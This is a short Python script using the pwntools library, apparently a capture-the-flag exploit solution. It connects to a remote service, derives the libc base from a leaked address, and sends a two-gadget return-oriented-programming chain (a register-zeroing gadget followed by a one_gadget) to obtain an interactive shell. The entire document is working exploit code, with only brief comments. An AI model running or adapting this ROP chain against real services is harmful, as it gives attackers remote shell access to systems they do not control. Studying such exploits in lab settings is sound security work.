from pwn import *
context.log_level="DEBUG"
context.arch='x86_64'
libc=ELF("./bc.so.6")
# conn=process("./two")
conn=remote("10.131.1.19",60011)
dis=240

base=int(conn.recvline(),16)-240-libc.symbols["__libc_start_main"]

#asm(xor rax,rax;retn).encode("hex")=4831c0c3
#ROP_gadget --binary bc.so.6 --opcode 4831c0c3
#xor rax,rax;ret
ret1=0x8b8c5+base

#one_gadget bc.so.6
#rax == 0 then getinto shell
ret2=0x45216+base

payload=flat(
	ret1,
	ret2
	)
conn.sendline(payload)
conn.interactive()
